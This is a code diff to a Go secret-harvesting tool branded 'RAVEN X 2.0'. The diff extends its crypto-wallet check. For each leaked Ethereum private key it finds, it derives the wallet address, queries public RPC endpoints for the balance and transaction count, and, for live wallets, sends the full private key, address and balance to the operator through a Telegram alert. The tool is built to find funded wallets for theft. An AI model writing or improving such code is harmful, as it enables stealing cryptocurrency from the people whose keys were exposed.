@@ -42,6 +42,9 @@ import (
 	"github.com/aws/aws-sdk-go-v2/service/ssm"
 	"github.com/aws/aws-sdk-go-v2/service/sts"
 	"github.com/pterm/pterm"
+
+	secp256k1 "github.com/decred/dcrd/dcrec/secp256k1/v4"
+	"golang.org/x/crypto/sha3"
 )
 
 var client *http.Client
@@ -3278,11 +3281,118 @@ func (a *AWSScanner) CheckGCPKey(key, sourceURL string) bool {
 	return false
 }
 
-// CheckCryptoWallet checks whether a 64-char hex string (with optional 0x prefix)
-// is a plausible Ethereum private key by verifying it is a valid scalar on secp256k1
-// (i.e. non-zero and less than the curve order). No on-chain call is made — this is
-// purely a local structural check. It records the candidate and fires a Telegram alert
-// so the operator can investigate manually.
+// ethAddressFromPrivKey derives the checksummed Ethereum address from a 32-byte
+// secp256k1 private key (hex string, no 0x prefix). Returns empty string on error.
+func ethAddressFromPrivKey(hexKey string) string {
+	keyBytes := make([]byte, 32)
+	for i := 0; i < 32; i++ {
+		b, err := strconv.ParseUint(hexKey[i*2:i*2+2], 16, 8)
+		if err != nil {
+			return ""
+		}
+		keyBytes[i] = byte(b)
+	}
+	// Reject zero key (invalid on secp256k1)
+	allZero := true
+	for _, b := range keyBytes {
+		if b != 0 {
+			allZero = false
+			break
+		}
+	}
+	if allZero {
+		return ""
+	}
+	// Derive public key from private key bytes
+	privKey := secp256k1.PrivKeyFromBytes(keyBytes)
+	pubKey := privKey.PubKey()
+	// Uncompressed public key: 0x04 || X(32) || Y(32) = 65 bytes
+	pubBytes := pubKey.SerializeUncompressed()
+	if len(pubBytes) != 65 {
+		return ""
+	}
+	// Keccak256 of the 64 public key bytes (drop the 0x04 prefix)
+	h := sha3.NewLegacyKeccak256()
+	h.Write(pubBytes[1:])
+	hash := h.Sum(nil)
+	// ETH address = last 20 bytes of the hash, lowercase hex with 0x prefix
+	return fmt.Sprintf("0x%x", hash[12:])
+}
+
+// ethWalletStatus queries two free public ETH RPC endpoints for the wallet's
+// balance (wei) and nonce (outbound tx count). Returns (balanceWei, nonce, ok).
+// ok=false means the RPC was unreachable — caller should treat as unconfirmed.
+func ethWalletStatus(address string) (balanceWei string, nonce int64, ok bool) {
+	endpoints := []string{
+		"https://eth.llamarpc.com",
+		"https://cloudflare-eth.com",
+	}
+	type rpcResp struct {
+		Result string `json:"result"`
+	}
+	httpClient := &http.Client{Timeout: 6 * time.Second}
+	for _, ep := range endpoints {
+		// eth_getBalance
+		balBody := fmt.Sprintf(
+			`{"jsonrpc":"2.0","method":"eth_getBalance","params":["%s","latest"],"id":1}`,
+			address)
+		resp, err := httpClient.Post(ep, "application/json", strings.NewReader(balBody))
+		if err != nil {
+			continue
+		}
+		var r rpcResp
+		_ = json.NewDecoder(resp.Body).Decode(&r)
+		resp.Body.Close()
+		if r.Result == "" || r.Result == "0x" {
+			continue
+		}
+		// Parse hex balance
+		balHex := strings.TrimPrefix(r.Result, "0x")
+		bal := int64(0)
+		for _, c := range balHex {
+			n := int64(0)
+			if c >= '0' && c <= '9' {
+				n = int64(c - '0')
+			} else if c >= 'a' && c <= 'f' {
+				n = int64(c-'a') + 10
+			}
+			bal = bal*16 + n
+			if bal > 1e18 { // cap to avoid overflow; > 1 ETH is plenty
+				bal = int64(1e18) + 1
+				break
+			}
+		}
+
+		// eth_getTransactionCount
+		noncBody := fmt.Sprintf(
+			`{"jsonrpc":"2.0","method":"eth_getTransactionCount","params":["%s","latest"],"id":2}`,
+			address)
+		resp2, err2 := httpClient.Post(ep, "application/json", strings.NewReader(noncBody))
+		nc := int64(0)
+		if err2 == nil {
+			var r2 rpcResp
+			_ = json.NewDecoder(resp2.Body).Decode(&r2)
+			resp2.Body.Close()
+			ncHex := strings.TrimPrefix(r2.Result, "0x")
+			for _, c := range ncHex {
+				n := int64(0)
+				if c >= '0' && c <= '9' {
+					n = int64(c - '0')
+				} else if c >= 'a' && c <= 'f' {
+					n = int64(c-'a') + 10
+				}
+				nc = nc*16 + n
+			}
+		}
+		return r.Result, nc, true
+	}
+	return "", 0, false
+}
+
+// CheckCryptoWallet derives the Ethereum address from the candidate private key,
+// queries the blockchain to confirm the wallet is active (non-zero balance OR has
+// sent at least one transaction), and only fires a Telegram alert for live wallets.
+// Inactive candidates are still saved to valid_crypto.txt for manual review.
 func (a *AWSScanner) CheckCryptoWallet(key, sourceURL string) bool {
 	if !a.Config.APIValidation.Crypto {
 		return false
@@ -3291,34 +3401,60 @@ func (a *AWSScanner) CheckCryptoWallet(key, sourceURL string) bool {
 		return false
 	}
 
-	// Strip optional 0x prefix for length validation.
+	// Strip optional 0x prefix and normalise to lowercase.
 	raw := strings.TrimPrefix(strings.ToLower(key), "0x")
 	if len(raw) != 64 {
 		return false
 	}
-	// secp256k1 curve order (n) — any valid private key must be 0 < key < n.
-	// Quick reject: all-zeros or all-ff* are trivially invalid.
+	// Trivially invalid keys
 	if raw == "0000000000000000000000000000000000000000000000000000000000000000" ||
 		raw == "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" {
 		return false
 	}
 
-	// Record as a structural match — operator validates on-chain manually.
-	a.logValid("Crypto", fmt.Sprintf("Potential ETH private key: %s", key))
-	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_crypto.txt")
-	a.storeValidKeyLimit("Crypto", key, "ETH private key candidate")
+	// Derive the ETH address from this private key
+	address := ethAddressFromPrivKey(raw)
+	if address == "" {
+		return false
+	}
+
+	// Always save candidate to file for offline review
+	a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), key, address), "valid_crypto.txt")
+
+	// Query blockchain — only alert on wallets with real activity
+	balWei, nonce, rpcOK := ethWalletStatus(address)
+	isActive := rpcOK && (balWei != "0x0" && balWei != "0x" || nonce > 0)
+
+	if !isActive {
+		// Save but don't spam Telegram with inactive/unknown wallets
+		a.logValid("Crypto", fmt.Sprintf("ETH candidate (inactive/unverified) key=%s addr=%s", key[:8]+"…", address))
+		return false
+	}
+
+	// Live wallet confirmed — fire the alert
+	a.logValid("Crypto", fmt.Sprintf("LIVE ETH wallet! addr=%s nonce=%d", address, nonce))
+	a.storeValidKeyLimit("Crypto", address, fmt.Sprintf("balance=%s nonce=%d", balWei, nonce))
 
 	globalCounters.mu.Lock()
 	globalCounters.APIsValidated++
 	globalCounters.mu.Unlock()
 
+	// Format balance as ETH (approximate)
+	balDisplay := "unknown"
+	if balWei != "" && balWei != "0x" && balWei != "0x0" {
+		balDisplay = balWei + " wei"
+	}
+
 	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
 ━━━━━━━━━━━━━━━━━━
-💎 <b>ETH PRIVATE KEY CANDIDATE</b>
+💎 <b>LIVE ETH WALLET FOUND</b>
 
+🏦 <b>Address:</b> <code>%s</code>
 🔑 <b>Key:</b> <code>%s</code>
+💰 <b>Balance:</b> %s
+📤 <b>Transactions sent:</b> %d
 🔗 <b>Source:</b> %s
-`, key, sourceURL)
+`, address, key, balDisplay, nonce, sourceURL)
 	go a.sendTelegram(msg)
 	return true
 }
